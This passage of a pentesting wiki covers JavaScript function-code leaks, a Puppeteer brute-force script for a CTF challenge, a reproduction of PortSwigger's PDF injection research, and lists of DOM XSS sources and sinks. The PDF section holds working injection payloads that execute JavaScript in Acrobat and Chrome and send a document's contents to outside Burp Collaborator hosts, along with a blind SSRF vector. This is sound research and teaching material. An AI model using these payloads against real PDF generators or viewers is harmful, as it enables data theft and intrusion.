//This will still use the this object and print "fixingparam1 Hello"
var bindFn_thisnull = fn.bind(null, "fixingparam1");
bindFn_change('Hello', 'World')

//This will still use the this object and print "fixingparam1 Hello"
var bindFn_this = fn.bind(this, "fixingparam1");
bindFn_change('Hello', 'World')
```

{% hint style="info" %}
Note that using **`bind`** you can manipulate the **`this`** object that is going to be used when calling the function.
{% endhint %}

### Function code leak

If you can **access the object** of a function you can **get the code** of that function

```javascript
function afunc(){
    return 1+1;
}
console.log(afunc.toString()); //This will print the code of the function
console.log(String(afunc)); //This will print the code of the function
console.log(this.afunc.toString()); //This will print the code of the function
console.log(global.afunc.toString()); //This will print the code of the function
```

In cases where the **function doesn't have any name**, you can still print the **function code** from within:

```javascript
(function (){ return arguments.callee.toString(); })()
(function (){ return arguments[0]; })("arg0")
```

Some **random** ways to **extract the code** of a function (even comments) from another function:

```javascript
(function (){ return retFunc => String(arguments[0]) })(a=>{/* Hidden commment */})()
(function (){ return retFunc => Array(arguments[0].toString()) })(a=>{/* Hidden commment */})()
(function (){ return String(this)}).bind(()=>{ /* Hidden commment */ })()
(u=>(String(u)))(_=>{ /* Hidden commment */ })
(u=>_=>(String(u)))(_=>{ /* Hidden commment */ })()
```

### Automatic Browser Access to test payloads

```javascript
//Taken from https://github.com/svennergr/writeups/blob/master/inti/0621/README.md
const puppeteer = require("puppeteer");

const realPasswordLength = 3000;
async function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

(async () => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  //Loop to iterate through different values
  for (let i = 0; i < 10000; i += 100) {
    console.log(`Run number ${i}`);
    const input = `${"0".repeat(i)}${realPasswordLength}`;
    console.log(`  https://challenge-0621.intigriti.io/passgen.php?passwordLength=${input}&allowNumbers=true&allowSymbols=true&timestamp=1624556811000`);
    //Go to the page
    await page.goto(
      `https://challenge-0621.intigriti.io/passgen.php?passwordLength=${input}&allowNumbers=true&allowSymbols=true&timestamp=1624556811000`
    );
    //Call function "generate()" inside the page
    await page.evaluate("generate()");
    //Get node inner text from an HTML element
    const passwordContent = await page.$$eval(
      ".alert .page-content",
      (node) => node[0].innerText
    );
    //Transform the content and print it in console
    const plainPassword = passwordContent.replace("Your password is: ", "");
    if (plainPassword.length != realPasswordLength) {
      console.log(i, plainPassword.length, plainPassword);
    }

    await sleep(1000);
  }
  await browser.close();
})();
```


# PDF Injection

**If your input is being reflected inside a PDF file, you can try to inject PDF data to execute JavaScript or steal the PDF content.**

The following information was taken from **\*\*\[**[https://portswigger.net/research/portable-data-exfiltration\*\*\](https://portswigger.net/research/portable-data-exfiltration)\*\*\*\*](https://portswigger.net/research/portable-data-exfiltration**]\(https://portswigger.net/research/portable-data-exfiltration\)****)

## PDF-Lib

This time, I was using [PDFLib](https://pdf-lib.js.org/). I took some time to use the library to create an annotation and see if I could inject a closing parenthesis into the annotation URI - and it worked! The sample vulnerable code I used to generate the annotation code was:

`...`  \
`A: {`  \
`Type: 'Action',`  \
`S: 'URI',`  \
``URI: PDFString.of(`injection)`),``  \
`}`  \
`})`  \
`...`

[Full code:](https://github.com/PortSwigger/portable-data-exfiltration/blob/main/PDF-research-samples/pdf-lib/first-injection/test.js)

How did I know the injection was successful? The PDF would render correctly unless I injected a closing parenthesis. This proved that the closing parenthesis was breaking out of the string and causing invalid PDF code. Breaking the PDF was nice, but I needed to ensure I could execute JavaScript of course. I looked at the rendered PDF code and noticed the output was being encoded using the FlateDecode filter. I wrote a little script to deflate the block and the output of the annotation section looked like this:\`<<\
/Type /Annot\
/Subtype /Link\
/Rect \[ 50 746.89 320 711.89 ]\
/Border \[ 0 0 2 ]\
/C \[ 0 0 1 ]\
/A <<\
/Type /Action\
/S /URI\
/URI (injection))

> > \`

As you can clearly see, the injection string is closing the text boundary with a closing parenthesis, which leaves an existing closing parenthesis that causes the PDF to be rendered incorrectly:

![Screenshot showing an error dialog when loading the PDF](https://portswigger.net/cms/images/34/f4/3ed2-article-screenshot-showing-damaged-pdf.png)

Great, so I could break the rendering of the PDF, now what? I needed to come up with an injection that called some JavaScript - the alert(1) of PDF injection.

Just like how XSS vectors depend on the browser's parsing, PDF injection exploitability can depend on the PDF renderer. I decided to start by targeting Acrobat because I thought the vectors were less likely to work in Chrome. Two things I noticed: 1) You could inject additional annotation actions and 2) if you repair the existing closing parenthesis then the PDF would render. After some experimentation, I came up with a nice payload that injected an additional annotation action, executed JavaScript, and repaired the closing parenthesis:`/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action>>/>>(`

First I break out of the parenthesis, then break out of the dictionary using >> before starting a new annotation dictionary. The /S/JavaScript makes the annotation JavaScript-based and the /JS is where the JavaScript is stored. Inside the parentheses is our actual JavaScript. Note that you don't have to escape the parentheses if they're balanced. Finally, I add the type of annotation, finish the dictionary, and repair the closing parenthesis. This was so cool; I could craft an injection that executed JavaScript but so what, right? You can execute JavaScript but you don't have access to the DOM, so you can't read cookies. Then James popped up and suggested stealing the contents of the PDF from the injection. I started looking at ways to get the contents of a PDF. In Acrobat, I discovered that you can use JavaScript to submit forms without any user interaction! Looking at the spec for the JavaScript API, it was pretty straightforward to modify the base injection and add some JavaScript that would send the entire contents of the PDF code to an external server in a POST request:`/blah)>>/A<</S/JavaScript/JS(app.alert(1);`  \
`this.submitForm({`  \
`cURL: 'https://your-id.burpcollaborator.net',cSubmitAs: 'PDF'}))`  \
`/Type/Action>>/>>(`

The alert is not needed; I just added it to prove the injection was executing JavaScript.

Next, just for fun, I looked at stealing the contents of the PDF without using JavaScript. From the PDF specification, I found out that you can use an action called SubmitForm. I used this in the past when I constructed a PDF for a scan check in Burp Suite. It does exactly what the name implies. It also has a Flags entry in the dictionary to control what is submitted. The Flags dictionary key accepts a single integer value, but each individual setting is controlled by a binary bit. A good way to work with these settings is using the new binary literals in ES6. The binary literal should be 14 bits long because there are 14 flags in total. In the following example, all of the settings are disabled:`0b00000000000000`

To set a flag, you first need to look up its bit position (table 237 of the [PDF specification](https://www.adobe.com/content/dam/acom/en/devnet/pdf/pdfs/PDF32000_2008.pdf)). In this case, we want to set the SubmitPDF flag. As this is controlled by the 9th bit, you just need to count 9 bits from the right:`0b00000100000000`

If you evaluate this with JavaScript, this results in the decimal value 256. In other words, setting the Flags entry to 256 will enable the SubmitPDF flag, which causes the contents of the PDF to be sent when submitting the form. All we need to do is use the base injection we created earlier and modify it to call the SubmitForm action instead of JavaScript:`/blah)>>/A<</S/SubmitForm/Flags 256/F(`  \
`https://your-id.burpcollaborator.net)`  \
`/Type/Action>>/>>(`

## sPDF

Next I applied my methodology to another PDF library - [jsPDF](https://parall.ax/products/jspdf) - and found it was vulnerable too. Exploiting this library was quite fun because they have an API that can execute in the browser and will allow you to generate the PDF in real time as you type. I noticed that, like the PDP-Lib library, they forgot to escape parentheses inside annotation URLs. Here the url property was vulnerable:`doc.createAnnotation({bounds:`  \
`{x:0,y:10,w:200,h:200},`  \
``type:'link',url:`/input`});``  \
`//vulnerable`

So I generated a PDF using their API and injected PDF code into the url property:

`var doc = new jsPDF();`  \
`doc.text(20, 20, 'Hello world!');`  \
`doc.addPage('a6','l');`  \
`doc.createAnnotation({bounds:`  \
`` {x:0,y:10,w:200,h:200},type:'link',url:` ``  \
`/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action/F 0/(`  \
`` `}); ``

I reduced the vector by removing the type entries of the dictionary and the unneeded F entry. I then left a dangling parenthesis that would be closed by the existing one. Reducing the size of the injection is important because the web application you are injecting to might only allow a limited amount of characters.`/blah)>>/A<</S/JavaScript/JS(app.alert(1)`

I then worked out that it was possible to reduce the vector even further! Acrobat would allow a URI and a JavaScript entry within one annotation action and would happily execute the JavaScript:`/)/S/JavaScript/JS(app.alert(1)`

Further research revealed that you can also inject multiple annotations. This means that instead of just injecting an action, you could break out of the annotation and define your own rect coordinates to choose which section of the document would be clickable. Using this technique, I was able to make the entire document clickable. `/) >> >>`  \
`<</Type /Annot /Subtype /Link /Rect [0.00 813.54 566.93 -298.27] /Border [0 0`  \
`0] /A <</S/SubmitForm/Flags 0/F(https://your-id.burpcollaborator.net`

## Executing annotations without interaction

So far, the vectors I've demonstrated require a click to activate the action from the annotation. Typically, James asked the question "Can we execute automatically?". I looked through the PDF specification and noticed some interesting features of annotations:

"The **PV** and **PI** entries allow a distinction between pages that are open and pages that are visible. At any one time, only a single page is considered open in the viewer application, while more than one page may be visible, depending on the page layout."

We can add the PV entry to the dictionary and the annotation will fire on Acrobat automatically! Not only that, but we can also execute a payload automatically when the PDF document is closed using the PC entry. An attacker could track you when you open the PDF and close it.

Here's how to execute automatically from an annotation:`` `var doc = new jsPDF(); ``  \
`doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/)

> > > > <\</Subtype /Screen /Rect \[0 0 900 900] /AA <\</PV <\</S/JavaScript/JS(app.alert(1))>>/(\`});\
> > > > doc.text(20, 20, 'Auto execute');\`\`

When you close the PDF, this annotation will fire:`var doc = new jsPDF();`  \
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >>``  \
``<</Subtype /Screen /Rect [0 0 900 900] /AA <</PC <</S/JavaScript/JS(app.alert(1))>>/(`});``  \
`doc.text(20, 20, 'Close me');`

## Chrome

I've talked a lot about Acrobat but what about PDFium (Chrome's PDF reader)? Chrome is tricky; the attack surface is much smaller as its JavaScript support is more limited than Acrobat's. The first thing I noticed was that JavaScript wasn't being executed in annotations at all, so my proof of concepts weren't working. In order to get the vectors working in Chrome, I needed to at least execute JavaScript inside annotations. First though, I decided to try and overwrite a URL in an annotation. This was pretty easy. I could use the base injection I came up with before and simply inject another action with a URI entry that would overwrite the existing URL:`var doc = new jsPDF();`  \
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/blah)>>/A<</S/URI/URI(https://portswigger.net)``  \
``/Type/Action>>/F 0>>(`});``  \
`doc.text(20, 20, 'Test text');`

This would navigate to portswigger.net when clicked. Then I moved on and tried different injections to call JavaScript, but this would fail every time. I thought it was impossible to do. I took a step back and tried to manually construct an entire PDF that would call JavaScript from a click in Chrome without an injection. When using an AcroForm button, Chrome would allow JavaScript execution, but the problem was it required references to parts of the PDF. I managed to craft an injection that would execute JavaScript from a click on JSPDF:`var doc = new jsPDF();`  \
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0.825 0.8275 0.8275]/CA(Submit)>>/Rect [ 72 697.8898 144 676.2897]/Subtype/Widget/AP<</N <</Type/XObject/BBox[ 0 0 72 21.6]/Subtype/Form>>>>/Parent <</Kids[ 3 0 R]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(app.alert(1))/Type/Action/F 4/DA(blah`});``  \
`doc.text(20, 20, 'Click me test');`

As you can see, the above vector requires knowledge of the PDF structure. \[ 3 0 R] refers to a specific PDF object and if we were doing a blind PDF injection attack, we wouldn't know the structure of it. Still, the next stage is to try a form submission. We can use the submitForm function for this, and because the annotation requires a click, Chrome will allow it:`/) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0.0 813.54 566.93 -298.27]/CA(Submit)>>/Rect [ 72 697.8898 144 676.2897]/Subtype/Widget/AP<</N <</Type/XObject/BBox[ 0 0 72 21.6]/Subtype/Form>>>>/Parent <</Kids[ 3 0 R]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(app.alert(1);this.submitForm('https://your-id.burpcollaborator.net'))/Type/Action/F 4/DA(blah`

This works, but it's messy and requires knowledge of the PDF structure. We can reduce it a lot and remove the reliance on the PDF structure:`#) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0 0 889 792]/CA(Submit)>>/Rect [ 0 0 889 792]/Subtype/Widget/AP<</N <</Type/XObject/Subtype/Form>>>>/Parent <</Kids[ ]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(`  \
`app.alert(1)`  \
`)/Type/Action/F 4/DA(blah`

There's still some code we can remove:`var doc = new jsPDF();`  \
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`#)>>>><</Type/Annot/Rect[ 0 0 900 900]/Subtype/Widget/Parent<</FT/Btn/T(A)>>/A<</S/JavaScript/JS(app.alert(1))/(`});``  \
`doc.text(20, 20, 'Test text');`

The code above breaks out of the annotation, creates a new one, and makes the entire page clickable. In order for the JavaScript to execute, we have to inject a button and give it any text using the "T" entry. We can then finally inject our JavaScript code using the JS entry in the dictionary. Executing JavaScript on Chrome is great. I never thought it would be possible when I started this research.

Next I looked at the submitForm function to steal the contents of the PDF. We know that we can call the function and it does contact an external server, as demonstrated in one of the examples above, but does it support the full Acrobat specification? I looked at the [source code of PDFium](https://github.com/PDFium/PDFium/blob/master/fpdfsdk/src/javascript/Document.cpp#L818) but the function doesn't support SubmitAsPDF :( You can see it supports FDF, but unfortunately this doesn't submit the contents of the PDF. I looked for other ways but I didn't know what objects were available. I took the same approach I did with Acrobat and wrote a fuzzer/enumerator to find interesting objects. Getting information out of Chrome was more difficult than Acrobat; I had to gather information in chunks before outputting it using the alert function. This was because the alert function truncated the string sent to it.`...`  \
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`#)>> <</Type/Annot/Rect[0 0 900 900]/Subtype/Widget/Parent<</FT/Btn/T(a)>>/A<</S/JavaScript/JS(``  \
`(function(){`  \
`var obj = this,`  \
`data = '',`  \
`chunks = [],`  \
`counter = 0,`  \
`added = false, i, props = [];`  \
`for(i in obj) {`  \
`props.push(i);`  \
`}`  \
`...`

[Full code](https://github.com/PortSwigger/portable-data-exfiltration/blob/main/PDF-research-samples/jsPDF/chrome/enumerator/test.js)

Inspecting the output of the enumerator, I tried calling various functions in the hope of making external requests or gathering information from the PDF. Eventually, I found a very interesting function called getPageNthWord, which could extract words from the PDF document, thereby allowing me to steal the contents. The function has a subtle bug where the first word sometimes will not be extracted. But for the most part, it will extract the majority of words:`var doc = new jsPDF();`  \
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`#)>> <</Type/Annot/Rect[0 0 900 900]/Subtype/Widget/Parent<</FT/Btn/T(a)>>/A<</S/JavaScript/JS(``  \
`words = [];`  \
`for(page=0;page<this.numPages;page++) {`  \
`for(wordPos=0;wordPos<this.getPageNumWords(page);wordPos++) {`  \
`word = this.getPageNthWord(page, wordPos, true);`  \
`words.push(word);`  \
`}`  \
`}`  \
`app.alert(words);`  \
`` `}); ``  \
`doc.text(20, 20, 'Click me test');`  \
`doc.text(20, 40, 'Abc Def');`  \
`doc.text(20, 60, 'Some word');`

I was pretty pleased with myself that I could steal the contents of the PDF on Chrome as I never thought this would be possible. Combining this with the submitForm vector would enable you to send the data to an external server. The only downside is that it requires a click. I wondered if you could get JavaScript execution without a click on Chrome. Looking at the PDF specification again, I noticed that there is another entry in the annotation dictionary called "E", which will execute the annotation when the mouse enters the annotation area - basically a mouseover event. Unfortunately, this does not count as user interaction to enable a form submission. So although you can execute JavaScript, you can't do anything with the data because you can't send it to an external server. If you can get Chrome to submit data with this event, please let me know because I'd be very interested to hear how. Anyway, here is the code to trigger a mouseover acton:`var doc = new jsPDF();`  \
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >>``  \
``<</Type /Annot /Subtype /Widget /Parent<</FT/Btn/T(a)>> /Rect [0 0 900 900] /AA <</E <</S/JavaScript/JS(app.alert(1))>>/(`});``  \
`doc.text(20, 20, 'Test');`

## SSRF in PDFium/Acrobat

It's possible to send a POST request with PDFium/Acrobat to perform a SSRF attack. This would be a [blind SSRF](https://portswigger.net/web-security/ssrf/blind) since you can make a POST request but can't read the response. To construct a POST request, you can use the /parent dictionary key as demonstrated earlier to assign a form element to the annotation, enabling JavaScript execution. But instead of using a button like we did before, you can assign a text field (/Tx) with the parameter name (/T) and parameter value (/V) dictionary keys. Notice how you have to pass the parameter names you want to use to the submitForm function as an array:`#)>>>><</Type/Annot/Rect[ 0 0 900 900]/Subtype/Widget/Parent<</FT/Tx/T(foo)/V(bar)>>/A<</S/JavaScript/JS(`  \
`app.alert(1);`  \
`this.submitForm('https://aiws4u6uubgfdag94xvc5wbrfilc91.burpcollaborator.net', false, false, ['foo']);`  \
`)/(`

You can even send raw new lines, which could be useful when chaining other attacks such as [request smuggling](https://portswigger.net/web-security/request-smuggling). The result of the POST request can be seen in the following Collaborator request:

![Screen shot showing a Burp Collaborator request from a PDF](https://portswigger.net/cms/images/3f/61/fd38-article-ssrf-screenshot.png)

Finally, I want to finish with a hybrid Chrome and Acrobat PDF injection. The first part injects JavaScript into the existing annotation to execute JavaScript on Acrobat. The second part breaks out of the annotation and injects a new annotation that defines a new clickable area for Chrome. I use the Acroform trick again to inject a button so that the JavaScript will execute: `var doc = new jsPDF();`  \
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`#)/S/JavaScript/JS(app.alert(1))/Type/Action>> >> <</Type/Annot/Rect[0 0 900 700]/Subtype/Widget/Parent<</FT/Btn/T(a)>>/A<</S/JavaScript/JS(app.alert(1)`});``  \
`doc.text(20, 20, 'Click me Acrobat');`  \
`doc.text(20, 60, 'Click me Chrome');`


# DOM XSS

## **DOM vulnerabilities**

> **Sources**
>
> A source is a JavaScript property that accepts data that is potentially attacker-controlled. An example of a source is the `location.search` property because it reads input from the query string, which is relatively simple for an attacker to control. Ultimately, any property that can be controlled by the attacker is a potential source. This includes the referring URL (exposed by the `document.referrer` string), the user's cookies (exposed by the `document.cookie` string), and web messages.
>
> **Sinks**
>
> A sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it. For example, the `eval()` function is a sink because it processes the argument that is passed to it as JavaScript. An example of an HTML sink is `document.body.innerHTML` because it potentially allows an attacker to inject malicious HTML and execute arbitrary JavaScript.

Fundamentally, DOM-based vulnerabilities arise when a website **passes data from a source to a sink**, which then handles the data in an unsafe way in the context of the client's session.

{% hint style="info" %}
**You can find a more updated list of sources and sinks in** [**https://github.com/wisec/domxsswiki/wiki**](https://github.com/wisec/domxsswiki/wiki)\*\*\*\*
{% endhint %}

**Common sources:**

```javascript
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
```

**Common Sinks:**

| \*\*\*\*[**Open Redirect**](#open-redirect)\*\*\*\*                            | [**Javascript Injection**](#javascript-injection)\*\*\*\*                         | [**DOM-data manipulation**](#dom-data-manipulation)\*\*\*\* | **jQuery**                                                                   |
| ------------------------------------------------------------------------------ | --------------------------------------------------------------------------------- | ----------------------------------------------------------- | ---------------------------------------------------------------------------- |
| `location`                                                                     | `eval()`                                                                          | `scriptElement.src`                                         | `add()`                                                                      |
| `location.host`                                                                | `Function() constructor`                                                          | `scriptElement.text`                                        | `after()`                                                                    |
| `location.hostname`                                                            | `setTimeout()`                                                                    | `scriptElement.textContent`                                 | `append()`                                                                   |
| `location.href`                                                                | `setInterval()`                                                                   | `scriptElement.innerText`                                   | `animate()`                                                                  |
| `location.pathname`                                                            | `setImmediate()`                                                                  | `someDOMElement.setAttribute()`                             | `insertAfter()`                                                              |
| `location.search`                                                              | `execCommand()`                                                                   | `someDOMElement.search`                                     | `insertBefore()`                                                             |
| `location.protocol`                                                            | `execScript()`                                                                    | `someDOMElement.text`                                       | `before()`                                                                   |
| `location.assign()`                                                            | `msSetImmediate()`                                                                | `someDOMElement.textContent`                                | `html()`                                                                     |
| `location.replace()`                                                           | `range.createContextualFragment()`                                                | `someDOMElement.innerText`                                  | `prepend()`                                                                  |
| `open()`                                                                       | `crypto.generateCRMFRequest()`                                                    | `someDOMElement.outerText`                                  | `replaceAll()`                                                               |
| `domElem.srcdoc`                                                               | **\`\`**[**Local file-path manipulation**](#local-file-path-manipulation)\*\*\*\* | `someDOMElement.value`                                      | `replaceWith()`                                                              |
| `XMLHttpRequest.open()`                                                        | `FileReader.readAsArrayBuffer()`                                                  | `someDOMElement.name`                                       | `wrap()`                                                                     |
| `XMLHttpRequest.send()`                                                        | `FileReader.readAsBinaryString()`                                                 | `someDOMElement.target`                                     | `wrapInner()`                                                                |
| `jQuery.ajax()`                                                                | `FileReader.readAsDataURL()`                                                      | `someDOMElement.method`                                     | `wrapAll()`                                                                  |
| `$.ajax()`                                                                     | `FileReader.readAsText()`                                                         | `someDOMElement.type`                                       | `has()`                                                                      |
| **\`\`**[**Ajax request manipulation**](#ajax-request-manipulation)\*\*\*\*    | `FileReader.readAsFile()`                                                         | `someDOMElement.backgroundImage`                            | `constructor()`                                                              |
| `XMLHttpRequest.setRequestHeader()`                                            | `FileReader.root.getFile()`                                                       | `someDOMElement.cssText`                                    | `init()`                                                                     |
| `XMLHttpRequest.open()`                                                        | `FileReader.root.getFile()`                                                       | `someDOMElement.codebase`                                   | `index()`                                                                    |
| `XMLHttpRequest.send()`                                                        | \*\*\*\*[**Link manipulation**](#link-manipulation)\*\*\*\*                       | `someDOMElement.innerHTML`                                  | `jQuery.parseHTML()`                                                         |
| `jQuery.globalEval()`                                                          | `someDOMElement.href`                                                             | `someDOMElement.outerHTML`                                  | `$.parseHTML()`                                                              |
| `$.globalEval()`                                                               | `someDOMElement.src`                                                              | `someDOMElement.insertAdjacentHTML`                         | \*\*\*\*[**Client-side JSON injection**](#client-side-sql-injection)\*\*\*\* |
| **\`\`**[**HTML5-storage manipulation**](#html-5-storage-manipulation)\*\*\*\* | `someDOMElement.action`                                                           | `someDOMElement.onevent`                                    | `JSON.parse()`                                                               |
| `sessionStorage.setItem()`                                                     | [**XPath injection**](#xpath-injection)\*\*\*\*                                   | `document.write()`                                          | `jQuery.parseJSON()`                                                         |
| `localStorage.setItem()`                                                       | `document.evaluate()`                                                             | `document.writeln()`                                        | `$.parseJSON()`                                                              |
| **\`\`**[**`Denial of Service`**](#denial-of-service)**\`\`**                  | `someDOMElement.evaluate()`                                                       | `document.title`                                            | **\`\`**[**Cookie manipulation**](#cookie-manipulation)\*\*\*\*              |
| `requestFileSystem()`                                                          | **\`\`**[**Document-domain manipulation**](#document-domain-manipulation)\*\*\*\* | `document.implementation.createHTMLDocument()`              | `document.cookie`                                                            |
| `RegExp()`                                                                     | `document.domain`                                                                 | `history.pushState()`                                       | \*\*\*\*[**WebSocket-URL poisoning**](#websocket-url-poisoning)\*\*\*\*      |
| \*\*\*\*[**Client-Side SQl injection**](#client-side-sql-injection)\*\*\*\*    | \*\*\*\*[**Web-message manipulation**](#web-message-manipulation)\*\*\*\*         | `history.replaceState()`                                    | `WebSocket`                                                                  |
| `executeSql()`                                                                 | `postMessage()`                                                                   | \`\`                                                        | \`\`                                                                         |

The **`innerHTML`** sink doesn't accept `script` elements on any modern browser, nor will `svg onload` events fire. This means you will need to use alternative elements like `img` or `iframe`.

This kind of XSS is probably the **hardest to find**, as you need to look inside the JS code, see if it's **using** any object whose **value you control**, and in that case, see if there is **any way to abuse** it to execute arbitrary JS.

## Examples

### Open Redirect

From: [https://portswigger.net/web-security/dom-based/open-redirection](https://portswigger.net/web-security/dom-based/open-redirection)

#### How

DOM-based open-redirection vulnerabilities arise when a script writes **attacker-controllable data** into a **sink** that can trigger **cross-domain navigation**.

Remember that **if you can start the URL** were the victim is going to be **redirected**, you could execute **arbitrary code** like: **`javascript:alert(1)`**

#### Sinks

```
location
location.host
location.hostname
location.href
location.pathname
location.search
location.protocol
location.assign()
location.replace()
open()
domElem.srcdoc
XMLHttpRequest.open()
XMLHttpRequest.send()
jQuery.ajax()
$.ajax()
```

### Cookie manipulation

From: [https://portswigger.net/web-security/dom-based/cookie-manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation)

#### How

DOM-based cookie-manipulation vulnerabilities arise when a script writes **attacker-controllable data into the value of a cookie**.\
This could be abuse to make the page behaves on unexpected manner (if the cookie is used in the web) or to perform a [session fixation](../../hacking-with-cookies#session-fixation) attack (if the cookie is used to track the user's session).

#### Sinks

```
document.cookie
```

### JavaScript Injection

From: [https://portswigger.net/web-security/dom-based/javascript-injection](https://portswigger.net/web-security/dom-based/javascript-injection)

#### How

DOM-based JavaScript-injection vulnerabilities arise when a script executes **attacker-controllable data as JavaScript**.

#### Sinks

```
eval()
Function() constructor
setTimeout()
setInterval()
setImmediate()
execCommand()
execScript()
msSetImmediate()
range.createContextualFragment()
crypto.generateCRMFRequest()
```

### Document-domain manipulation

From: [https://portswigger.net/web-security/dom-based/document-domain-manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)

#### How

Document-domain manipulation vulnerabilities arise when a script uses **attacker-controllable data to set** the **`document.domain`** property.

The `document.domain` property is used by browsers in their **enforcement** of the **same origin policy**. If **two pages** from **different** origins explicitly set the **same `document.domain`** value, then those two pages can **interact in unrestricted ways**.\
Browsers **generally enforce some restrictions** on the values that can be assigned to `document.domain`, and may prevent the use of completely different values than the actual origin of the page. **But this doesn't occur always** and they usually **allow to use child** or **parent** domains.

#### Sinks

```
document.domain
```

### WebSocket-URL poisoning

From: [https://portswigger.net/web-security/dom-based/websocket-url-poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)

#### How

WebSocket-URL poisoning occurs when a script uses **controllable data as the target URL** of a WebSocket connection.

#### Sinks

The `WebSocket` constructor can lead to WebSocket-URL poisoning vulnerabilities.

### Link manipulation

From: [https://portswigger.net/web-security/dom-based/link-manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)

#### How

DOM-based link-manipulation vulnerabilities arise when a script writes **attacker-controllable data to a navigation target** within the current page, such as a clickable link or the submission URL of a form.

#### Sinks

```
someDOMElement.href
someDOMElement.src
someDOMElement.action
```

### Ajax request manipulation

From: [https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)

#### How

Ajax request manipulation vulnerabilities arise when a script writes **attacker-controllable data into the an Ajax request** that is issued using an `XmlHttpRequest` object.

#### Sinks

```
XMLHttpRequest.setRequestHeader()
XMLHttpRequest.open()
XMLHttpRequest.send()
jQuery.globalEval()
$.globalEval()
```

### Local file-path manipulation

From: [https://portswigger.net/web-security/dom-based/local-file-path-manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)

#### How

Local file-path manipulation vulnerabilities arise when a script passes **attacker-controllable data to a file-handling API** as the `filename` parameter. An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will cause the **user's browser to open/write an arbitrary local file**.

#### Sinks

```
FileReader.readAsArrayBuffer()
FileReader.readAsBinaryString()
FileReader.readAsDataURL()
FileReader.readAsText()
FileReader.readAsFile()
FileReader.root.getFile()
FileReader.root.getFile()
```

### Client-Side SQl injection

From: [https://portswigger.net/web-security/dom-based/client-side-sql-injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)

#### How

Client-side SQL-injection vulnerabilities arise when a script incorporates **attacker-controllable data into a client-side SQL query in an unsafe way**.

#### Sinks

```
executeSql()
```

### HTML5-storage manipulation

From: [https://portswigger.net/web-security/dom-based/html5-storage-manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)

#### How

HTML5-storage manipulation vulnerabilities arise when a script **stores attacker-controllable data in the HTML5 storage** of the web browser (either `localStorage` or `sessionStorage`).\
This **behavior does not in itself constitute a security vulnerability**. However, if the application later **reads data back from storage and processes it in an unsafe way**, an attacker may be able to leverage the storage mechanism to deliver other DOM-based attacks, such as cross-site scripting and JavaScript injection.

#### Sinks

```
sessionStorage.setItem()
localStorage.setItem()
```

### XPath injection

From: [https://portswigger.net/web-security/dom-based/client-side-xpath-injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)

#### How

DOM-based XPath-injection vulnerabilities arise when a script incorporates **attacker-controllable data into an XPath query**.

#### Sinks

```
document.evaluate()
someDOMElement.evaluate()
```

### Client-side JSON injection

From: [https://portswigger.net/web-security/dom-based/client-side-json-injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)

#### How

DOM-based JSON-injection vulnerabilities arise when a script incorporates **attacker-controllable data into a string that is parsed as a JSON data structure and then processed by the application**.

#### Sinks

```
JSON.parse()
jQuery.parseJSON()
$.parseJSON()
```

### Web-message manipulation

From: [https://portswigger.net/web-security/dom-based/web-message-manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)

#### How

Web-message vulnerabilities arise when a script sends **attacker-controllable data as a web message to another document** within the browser.\
**Example** of vulnerable Web-message manipulation in [https://portswigger.net/web-security/dom-based/controlling-the-web-message-source](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)

#### Sinks

The `postMessage()` method for sending web messages can lead to vulnerabilities if the event listener for receiving messages handles the incoming data in an unsafe way.

### DOM-data manipulation

From: [https://portswigger.net/web-security/dom-based/dom-data-manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)

#### How

DOM-data manipulation vulnerabilities arise when a script writes **attacker-controllable data to a field within the DOM** that is used within the visible UI or client-side logic. An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will modify the appearance or behaviour of the client-side UI.

#### Sinks

```
scriptElement.src
scriptElement.text
scriptElement.textContent
scriptElement.innerText
someDOMElement.setAttribute()
someDOMElement.search
someDOMElement.text
someDOMElement.textContent
someDOMElement.innerText
someDOMElement.outerText
someDOMElement.value
someDOMElement.name
someDOMElement.target
someDOMElement.method
someDOMElement.type
someDOMElement.backgroundImage
someDOMElement.cssText
someDOMElement.codebase
document.title
document.implementation.createHTMLDocument()
history.pushState()
history.replaceState()
```

### Denial of Service

